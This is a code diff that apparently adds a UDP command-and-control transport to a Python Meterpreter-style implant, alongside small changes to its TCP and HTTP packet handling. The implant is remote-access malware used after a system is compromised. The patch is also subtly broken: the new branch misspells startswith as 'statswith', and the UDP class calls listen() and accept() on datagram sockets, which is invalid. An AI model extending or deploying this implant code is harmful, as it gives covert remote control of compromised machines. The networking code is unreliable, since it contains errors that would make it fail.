@@ -641,6 +641,8 @@ class Transport(object):
         url = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
         if url.startswith('tcp'):
             transport = TcpTransport(url)
+        elif url.statswith('udp'):
+            transport = UdpTransport(url)
         elif url.startswith('http'):
             proxy = packet_get_tlv(request, TLV_TYPE_TRANS_PROXY_HOST).get('value')
             user_agent = packet_get_tlv(request, TLV_TYPE_TRANS_UA).get('value', HTTP_USER_AGENT)
@@ -793,7 +795,7 @@ class HttpTransport(Transport):
             url_h = urllib.urlopen(request, timeout=self.communication_timeout)
             packet = url_h.read()
             for _ in range(1):
-                if packet == '':
+                if not len(packet):
                     break
                 if len(packet) < PACKET_HEADER_SIZE:
                     packet = None  # looks corrupt
@@ -895,7 +897,7 @@ class TcpTransport(Transport):
         if not select.select([self.socket], [], [], 0.5)[0]:
             return bytes()
         packet = self.socket.recv(PACKET_HEADER_SIZE)
-        if packet == '':  # remote is closed
+        if not len(packet):  # remote is closed
             self.request_retire = True
             return None
         if len(packet) != PACKET_HEADER_SIZE:
@@ -929,6 +931,97 @@ class TcpTransport(Transport):
     @classmethod
     def from_socket(cls, sock):
         url = 'tcp://'
+        address, port = sock.getsockname()[:2]
+        # this will need to be changed if the bind stager ever supports binding to a specific address
+        if not address in ('', '0.0.0.0', '::'):
+            address, port = sock.getpeername()[:2]
+        url += address + ':' + str(port)
+        return cls(url, sock)
+
+class UdpTransport(Transport):
+    def __init__(self, url, socket=None):
+        super(UdpTransport, self).__init__()
+        self.url = url
+        self.socket = socket
+        self._first_packet = True
+        self._buffer = bytes()
+
+    def _activate(self):
+        address, port = self.url[6:].rsplit(':', 1)
+        port = int(port.rstrip('/'))
+        timeout = max(self.communication_timeout, 30)
+        if address in ('', '0.0.0.0', '::'):
+            try:
+                server_sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+                server_sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
+            except (AttributeError, socket.error):
+                server_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            server_sock.bind(('', port))
+            server_sock.listen(1)
+            if not select.select([server_sock], [], [], timeout)[0]:
+                server_sock.close()
+                return False
+            sock, _ = server_sock.accept()
+            server_sock.close()
+        else:
+            if ':' in address:
+                sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+            else:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(timeout)
+            sock.connect((address, port))
+            sock.settimeout(None)
+        self.socket = sock
+        self._first_packet = True
+        return True
+
+    def __recv(self, size):
+        if size > len(self._buffer):
+            self._buffer += self.socket.recv(2048)
+        result = self._buffer[:size]
+        self._buffer = self._buffer[size:]
+        return result
+
+    def _get_packet(self):
+        first = self._first_packet
+        self._first_packet = False
+        if not select.select([self.socket], [], [], 0.5)[0]:
+            return bytes()
+        packet = self.__recv(PACKET_HEADER_SIZE)
+        if not len(packet):  # remote is closed
+            self.request_retire = True
+            return None
+        if len(packet) != PACKET_HEADER_SIZE:
+            if first and len(packet) == 4:
+                received = 0
+                header = packet[:4]
+                pkt_length = struct.unpack('>I', header)[0]
+                self.socket.settimeout(max(self.communication_timeout, 30))
+                while received < pkt_length:
+                    received += len(self.__recv(pkt_length - received))
+                self.socket.settimeout(None)
+                return self._get_packet()
+            return None
+
+        xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE])
+        # XOR the whole header first
+        header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE])
+        # Extract just the length
+        pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF+PACKET_LENGTH_SIZE])[0]
+        pkt_length -= 8
+        # Read the rest of the packet
+        rest = bytes()
+        while len(rest) < pkt_length:
+            rest += self.__recv(pkt_length - len(rest))
+        # return the whole packet, as it's decoded separately
+        return packet + rest
+
+    def _send_packet(self, packet):
+        self.socket.send(struct.pack('>I', len(packet)) + packet)
+
+    @classmethod
+    def from_socket(cls, sock):
+        url = 'udp://'
         address, port = sock.getsockname()[:2]
         # this will need to be changed if the bind stager ever supports binding to a specific address
         if not address in ('', '0.0.0.0', '::'):
@@ -1396,6 +1489,9 @@ if not _try_to_fork or (_try_to_fork and os.fork() == 0):
     if HTTP_CONNECTION_URL and has_urllib:
         transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
                 http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
+    elif s.type == socket.SOCK_DGRAM:
+        # PATCH-SETUP-STAGELESS-UDP-SOCKET #
+        transport = UdpTransport.from_socket(s)
     else:
         # PATCH-SETUP-STAGELESS-TCP-SOCKET #
         transport = TcpTransport.from_socket(s)
